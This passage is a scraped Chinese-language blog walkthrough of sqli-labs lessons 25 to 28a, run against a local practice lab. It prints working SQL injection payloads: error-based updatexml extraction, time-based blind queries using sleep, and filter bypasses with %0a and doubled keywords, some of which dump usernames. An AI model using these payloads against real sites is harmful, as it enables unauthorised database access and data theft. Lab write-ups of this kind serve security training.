+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema&#x3D;&#39;security&#39;)%26%26(table_name&#x3D;&#39;users&#39;))),1)   ||&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">这里使用%26(&amp;)不能直接使用&amp;&amp;或者and</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584865214954.png" alt="1584865214954"></p>
+<p>查看username中的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-26&#x2F;?id&#x3D;1&#39; || updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)where(id&#x3D;2))),1)   ||&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">修改where后id的值进行换行查看</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E6%B3%A8%E9%87%8A%E7%AC%A6%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584865186922.png" alt="1584865186922"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十六关a" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3a/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.519Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3a/">
+        sqli-labs关卡/sqli-labs第二十六关a
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十八关时间过滤了空格" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.518Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/">
+        sqli-labs关卡/sqli-labs第二十八关时间过滤了空格
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这里使用延迟注入</p>
+<p>先测试库长度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(length(database())&gt;1,1,sleep(5)  )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当database()大于1的时候，返回时间为2秒，说明正确。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584894948317.png" alt="1584894948317"></p>
+<p>将大于一改为等于1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(length(database())&#x3D;1,1,sleep(5)  )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当数据库长度等于1时返回时间7秒标识错误，说明数据库长度不等于1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895052245.png" alt="1584895052245"></p>
+<p>将字符长度改为8</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(length(database())&#x3D;8,1,sleep(5)  )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">返回时间两秒说明字符长度是8</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895132736.png" alt="1584895132736"></p>
+<p>测试当前数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr(database(),1,1))&#x3D;&#39;115&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">页面返回两秒说明正确，115的ascii对应的是s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895481961.png" alt="1584895481961"></p>
+<p>尝试其他ascii码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr(database(),1,1))&#x3D;&#39;116&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于116时候页面返回7秒说明错误</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895526600.png" alt="1584895526600"></p>
+<p>测试出当前数据库是security</p>
+<p>测试security中的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  table_name  %0a  from   %0a  information_schema.tables  %0a  where  %0a   table_schema&#x3D;database()  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;101&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于101是返回两秒正确</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896025344.png" alt="1584896025344"></p>
+<p>测试其他ascii码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  table_name  %0a  from   %0a  information_schema.tables  %0a  where  %0a   table_schema&#x3D;database()  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;102&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">执行了7秒说明错误</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896070184.png" alt="1584896070184"></p>
+<p>得出结果为第一个表示emails</p>
+<p>更改limit的值可以查看当前库下的其他表</p>
+<h5 id="就以emails为例，查看emails下的字段"><a href="#就以emails为例，查看emails下的字段" class="headerlink" title="就以emails为例，查看emails下的字段"></a>就以emails为例，查看emails下的字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  column_name  %0a  from   %0a  information_schema.columns  %0a  where  %0a   table_name&#x3D;&#39;emails&#39;  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;105&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于105页面返回两秒说明正确，ascii对应的是i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896357179.png" alt="1584896357179"></p>
+<p>查看错误ascii</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  column_name  %0a  from   %0a  information_schema.columns  %0a  where  %0a   table_name&#x3D;&#39;emails&#39;  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;106&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">将ascii改为106，发现页面返回7秒，说明错误</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896409987.png" alt="1584896409987"></p>
+<p>经过测试得出结果为id</p>
+<p>查看id字段的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  id  %0a  from %0a emails  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;49&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于49时返回时间两秒正确，ascii对应的是1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896563519.png" alt="1584896563519"></p>
+<p>登录mysql查看id是否为1，第一行id确实为1，说明正确</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896617230.png" alt="1584896617230"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十八关a双写" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.516Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/">
+        sqli-labs关卡/sqli-labs第二十八关a双写
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>查看源码，这里查询语句用(‘id’)也就是说要用’)进行闭合。</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933523420.png" alt="1584933523420"></p>
+<p>只有 /union\s+select/过滤了之外其他的都没过滤，而且是union+select，也就是说这两个连在一起才会过滤</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933569676.png" alt="1584933569676"></p>
+<p>先查看字段数，以为order by 没被过滤，直接使用order by 即可，3返回正常，4返回错误</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933746277.png" alt="1584933746277"></p>
+<p>查询当前注入点使用union select 报错了</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933790903.png" alt="1584933790903"></p>
+<p>没有显示union select 表示过滤了</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933805272.png" alt="1584933805272"></p>
+<p>进行双写试试，双写之后还是报错</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933861053.png" alt="1584933861053"></p>
+<p>查看一下报错原因没发现union select 连在一起了，</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584933879202.png" alt="1584933879202"></p>
+<p>使用%0a进行空格开</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;1&#39;)  union  %0a  union  selectselect 1,2,3  --+</span><br><span class="line">页面返回正常，</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934773030.png" alt="1584934773030"></p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934789573.png" alt="1584934789573"></p>
+<p>因为页面只回显正确的，所以将id进行报错</p>
+<p>页面返回注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,3  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934850068.png" alt="1584934850068"></p>
+<p>查看当前数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,database()  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584934884885.png" alt="1584934884885"></p>
+<p>查看当前数据库中的表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584935001678.png" alt="1584935001678"></p>
+<p>查看users表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584935045339.png" alt="1584935045339"></p>
+<p>查看username字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,group_concat(username)from users  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584935073937.png" alt="1584935073937"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-sqli-labs关卡/sqli-labs第二十五关双写" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.514Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/">
+        sqli-labs关卡/sqli-labs第二十五关双写
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>先进入25关，页面返回这样</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845399719.png" alt="1584845399719"></p>
+<p>按照要求输入ID，页面返回在正常</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845433730.png" alt="1584845433730"></p>
+<p>使用万能单引号测试是否有报错信息</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845487845.png" alt="1584845487845"></p>
+<p>页面返回错误，发现后面多了个单引号蛮实用注释符注释一下，页面返回正常</p>
+<p>注：在这里不能直接使用#因为并不能注释</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845550173.png" alt="1584845550173"></p>
+<p>返回正常，查看当前字段数使用order by 查看</p>
+<p>当我们输入3的时候发现order by 只出来了der by 3说明or被过滤了，尝试将or进行双写</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845904257.png" alt="1584845904257"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25&#x2F;?id&#x3D;1&#39; oorrder by 3 --+</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845985708.png" alt="1584845985708"></p>
+<p>查看注入点</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846024505.png" alt="1584846024505"></p>
+<p>查看库名</p>
